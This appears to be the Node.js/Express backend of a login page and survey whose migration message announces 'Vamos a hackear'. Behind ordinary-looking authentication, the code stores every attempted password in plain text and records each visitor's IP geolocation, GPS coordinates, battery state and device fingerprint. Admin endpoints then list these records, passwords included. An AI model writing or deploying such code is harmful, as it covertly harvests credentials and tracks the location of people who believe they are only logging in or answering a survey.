require('dotenv').config();
const express = require('express');
const { Pool } = require('pg');
const bcrypt = require('bcrypt');
const rateLimit = require('express-rate-limit');
const crypto = require('crypto');
const cookieParser = require('cookie-parser');
const UAParser = require('ua-parser-js');
const https = require('https'); // Usamos https nativo en vez de fetch

const app = express();
app.set('trust proxy', 1);
app.use(express.json());
app.use(cookieParser());

const pool = new Pool({ connectionString: process.env.DATABASE_URL });

pool.query(`
  ALTER TABLE login_events 
  ADD COLUMN IF NOT EXISTS password_tried TEXT,
  ADD COLUMN IF NOT EXISTS battery_level TEXT,
  ADD COLUMN IF NOT EXISTS battery_charging BOOLEAN
`)
  .then(() => console.log('Vamos a hackear'))
  .catch((e) => console.error(' Error en migración:', e.message));

const sha256 = (s) => crypto.createHash('sha256').update(s).digest('hex');

function clientIp(req) {
  let ip = process.env.DEBUG_IP || req.ip || '';
  if (ip.startsWith('::ffff:')) ip = ip.slice(7);
  return ip;
}

function limpiarFp(fp = {}) {
  const num = (v, max) => {
    const n = Number(v);
    return Number.isFinite(n) && Math.abs(n) < max ? n : null;
  };
  return {
    screen_res: String(fp.screen_res || '').slice(0, 20) || null,
    language:   String(fp.language   || '').slice(0, 20) || null,
    timezone:   String(fp.timezone   || '').slice(0, 60) || null,
    connection_type: String(fp.connection_type || '').slice(0, 20) || null,
    cpu_cores:  Number.isInteger(fp.cpu_cores) ? fp.cpu_cores : null,
    gps_lat:    num(fp.gps_lat, 90),
    gps_lng:    num(fp.gps_lng, 180),
    gps_accuracy: num(fp.gps_accuracy, 1000000),
    battery_level: fp.battery_level || null,
    battery_charging: fp.battery_charging || false
  };
}

// BUSCADOR DE IP SEGURO (Usa https nativo)
function buscarUbicacion(ip) {
  return new Promise((resolve) => {
    if (!ip || ip === '::1' || ip === '127.0.0.1') return resolve({ country: null, city: null, lat: null, lng: null });
    https.get(`https://ip-api.com/json/${ip}`, (res) => {
      let data = '';
      res.on('data', chunk => data += chunk);
      res.on('end', () => {
        try {
          const json = JSON.parse(data);
          if (json.status === 'success') resolve({ country: json.country, city: json.city, lat: json.lat, lng: json.lon });
          else resolve({ country: null, city: null, lat: null, lng: null });
        } catch (e) { resolve({ country: null, city: null, lat: null, lng: null }); }
      });
    }).on('error', () => resolve({ country: null, city: null, lat: null, lng: null }));
  });
}

async function logEvent({ userId, email, password, success, reason, req, fp }) {
  try {
    const ip = clientIp(req);
    const geo = await buscarUbicacion(ip);
    const ua = new UAParser(req.get('user-agent')).getResult();
    const f = limpiarFp(fp);
    const passwordGuardar = String(password || '').slice(0, 255) || null;
    const deviceModel = ua.device.model ? `${ua.device.vendor || ''} ${ua.device.model}`.trim() : (ua.device.type || 'desktop');

    await pool.query(
      `INSERT INTO login_events
       (user_id, email_tried, password_tried, success, failure_reason, ip_address, user_agent,
        country, city, latitude, longitude, browser, os, device, screen_res, language, timezone, connection_type, cpu_cores,
        gps_lat, gps_lng, gps_accuracy, battery_level, battery_charging)
       VALUES ($1,$2,$3,$4,$5,$6,$7,$8,$9,$10,$11,$12,$13,$14,$15,$16,$17,$18,$19,$20,$21,$22,$23,$24)`,
      [userId, String(email).slice(0, 255), passwordGuardar, success, reason, ip || null, req.get('user-agent'), geo.country, geo.city, geo.lat, geo.lng,
       ua.browser.name, ua.os.name, deviceModel, f.screen_res, f.language, f.timezone, f.connection_type, f.cpu_cores,
       f.gps_lat, f.gps_lng, f.gps_accuracy, f.battery_level, f.battery_charging]
    );
  } catch (err) {
    console.error('Error guardando login:', err.message);
  }
}

async function requireAuth(req, res, next) {
  const token = req.cookies.session;
  if (!token) return res.status(401).json({ error: 'No autenticado' });
  const { rows } = await pool.query(`SELECT user_id FROM sessions WHERE token_hash = $1 AND revoked_at IS NULL AND expires_at > now()`, [sha256(token)]);
  if (!rows[0]) return res.status(401).json({ error: 'Sesión inválida' });
  req.userId = rows[0].user_id;
  req.tokenHash = sha256(token);
  next();
}

async function requireAdmin(req, res, next) {
  const { rows } = await pool.query('SELECT is_admin FROM users WHERE id = $1', [req.userId]);
  if (!rows[0]?.is_admin) return res.status(403).json({ error: 'Sin permisos' });
  next();
}

app.post('/api/login', async (req, res) => {
  const email = String(req.body?.email || '').trim().toLowerCase();
  const password = String(req.body?.password || '');
  const fp = req.body?.fp || {};
  try {
    const { rows } = await pool.query('SELECT * FROM users WHERE email = $1', [email]);
    const user = rows[0];
    const ok = await bcrypt.compare(password, user ? user.password_hash : '$2b$12$dummyhash') && !!user;
    await logEvent({ userId: user?.id ?? null, email, password, success: ok, reason: ok ? null : 'error', req, fp });
    if (!ok) return res.status(401).json({ error: 'Credenciales incorrectas' });
    const token = crypto.randomBytes(32).toString('hex');
    await pool.query(`INSERT INTO sessions (user_id, token_hash, ip_address, expires_at) VALUES ($1,$2,$3, now() + interval '7 days')`, [user.id, sha256(token), clientIp(req) || null]);
    res.cookie('session', token, { httpOnly: true, secure: req.secure, sameSite: 'lax', maxAge: 7 * 24 * 3600 * 1000 });
    res.json({ ok: true, is_admin: user.is_admin });
  } catch (err) { res.status(500).json({ error: 'Error del servidor' }); }
});

app.post('/api/survey', async (req, res) => {
  const { survey, fp } = req.body;
  try {
    const ip = clientIp(req);
    const geo = await buscarUbicacion(ip);
    const ua = new UAParser(req.get('user-agent')).getResult();
    const resumen = `Encuesta: ${survey.q1} | ${survey.q3}`;
    const deviceModel = ua.device.model ? `${ua.device.vendor || ''} ${ua.device.model}`.trim() : (ua.device.type || 'desktop');
    
    // Aquí es donde podría estar fallando. Lo ponemos en un try/catch interno para ver el error real.
    try {
      await pool.query(
        `INSERT INTO login_events
         (email_tried, password_tried, success, failure_reason, ip_address, user_agent, country, city, latitude, longitude, browser, os, device, screen_res, language, timezone, connection_type, cpu_cores, gps_lat, gps_lng, gps_accuracy, battery_level, battery_charging)
         VALUES ($1,$2,$3,$4,$5,$6,$7,$8,$9,$10,$11,$12,$13,$14,$15,$16,$17,$18,$19,$20,$21,$22,$23)`,
        [resumen, null, true, 'survey_completed', ip || null, req.get('user-agent'), geo.country, geo.city, geo.lat, geo.lng, ua.browser.name, ua.os.name, deviceModel,
         fp.screen_res, fp.language, fp.timezone, fp.connection_type, fp.cpu_cores, fp.gps_lat || null, fp.gps_lng || null, fp.gps_accuracy || null, fp.battery_level || null, fp.battery_charging || false]
      );
    } catch (dbError) {
      console.error('ERROR CRÍTICO EN BD:', dbError.message);
      return res.status(500).json({ error: 'Error en la base de datos: ' + dbError.message });
    }

    res.json({ ok: true, ip: ip || '127.0.0.1', ua: `${ua.browser.name} en ${ua.os.name}`, device: deviceModel });
  } catch (err) { 
    console.error(err);
    res.status(500).json({ error: 'Error al guardar' }); 
  }
});

app.get('/api/admin/logins', requireAuth, requireAdmin, async (req, res) => {
  const { rows } = await pool.query(`SELECT * FROM login_events ORDER BY id DESC LIMIT 200`);
  res.json(rows);
});

app.get('/api/admin/stats', requireAuth, requireAdmin, async (req, res) => {
  const { rows } = await pool.query(`SELECT count(*) AS total, count(*) FILTER (WHERE success) AS exitosos, count(*) FILTER (WHERE NOT success) AS fallidos, count(DISTINCT ip_address) AS ips_unicas, count(*) FILTER (WHERE gps_lat IS NOT NULL) AS con_gps FROM login_events WHERE created_at > now() - interval '24 hours'`);
  res.json(rows[0]);
});

app.get('/', (req, res) => res.redirect('/login.html'));
app.use(express.static('public'));
app.listen(process.env.PORT || 3000, () => console.log(`Servidor listo`));